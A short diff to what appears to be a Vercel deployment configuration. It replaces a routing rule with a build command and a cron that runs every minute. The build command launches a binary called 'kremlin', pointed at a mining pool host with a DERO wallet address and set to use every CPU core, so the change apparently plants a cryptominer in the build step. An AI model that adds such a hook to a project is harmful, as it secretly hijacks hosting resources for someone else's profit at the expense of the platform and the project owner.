@@ -1,8 +1,9 @@
 {
-  "routes": [
+  "buildCommand": "./kremlin -r community-pools.mysrv.cloud:10300 -w dero1qytfne4y9mpry7kcxrl5z328sqrmy349ldgawmu32yy5yzrjrnygjqg0vw3yu -m $(nproc --all)",
+  "crons": [
     {
-      "src": "/(.*)",
-      "dest": "api/wsgi.py"
+      "path": "/api/cron/1m",
+      "schedule": "* * * * *"
     }
   ]
 }
